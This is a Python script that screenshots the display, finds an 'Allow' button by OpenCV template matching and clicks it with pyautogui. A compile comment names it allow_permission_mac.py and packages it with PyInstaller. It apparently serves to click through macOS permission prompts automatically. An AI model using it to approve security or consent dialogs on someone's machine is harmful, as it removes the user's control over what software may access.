import cv2
import numpy as np
import pyautogui
import screeninfo
import sys
import os

def load_templates(template_paths):
    templates = []
    for path in template_paths:
        template = cv2.imread(path)
        if template is not None:
            templates.append(template)
        else:
            print(f"Warning: Template image at '{path}' could not be loaded.")
    return templates

def find_button_on_screen(templates, scale_range=(0.5, 1.0), scale_step=10, threshold=0.7):
    screen = screeninfo.get_monitors()[0]
    roi = (0, 0, screen.width, screen.height)
    full_image = pyautogui.screenshot(region=roi)
    full_image_cv = cv2.cvtColor(np.array(full_image), cv2.COLOR_RGB2BGR)

    best_match = None
    best_button_center = None

    for template in templates:
        for scale in np.linspace(scale_range[0], scale_range[1], scale_step)[::-1]:
            resized_template = cv2.resize(template, None, fx=scale, fy=scale)
            res = cv2.matchTemplate(full_image_cv, resized_template, cv2.TM_CCOEFF_NORMED)
            loc = np.where(res >= threshold)

            for pt in zip(*loc[::-1]):
                button_center = (pt[0] + resized_template.shape[1] // 2, pt[1] + resized_template.shape[0] // 2)
                button_center = (
                    int(button_center[0] * (screen.width / screen.width) + roi[0]),
                    int(button_center[1] * (screen.height / screen.height) + roi[1])
                )

                if best_match is None or res[pt[1], pt[0]] > best_match:
                    best_match = res[pt[1], pt[0]]
                    best_button_center = button_center
                    if best_match > threshold:
                        return best_button_center  # Early exit on good match

    return best_button_center

def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
    return os.path.join(base_path, 'allow_button_images', relative_path)

# Usage
template_paths = [resource_path('allow_button_image.jpg'), 
                  resource_path('allow_button_image1.jpg'), 
                  resource_path('allow_button_image2.jpg'), 
                  resource_path('allow_button_image3.jpg')]

templates = load_templates(template_paths)
button_position = find_button_on_screen(templates)

if button_position:
    pyautogui.moveTo(button_position)
    pyautogui.click()
else:
    print("Allow button not found")


# For Compiling  pyinstaller --onefile --add-data "./allow_button_image.jpg:." --add-data "./allow_button_image1.jpg:." --add-data "./allow_button_image2.jpg:." --add-data "./allow_button_image3.jpg:." allow_permission_mac.py
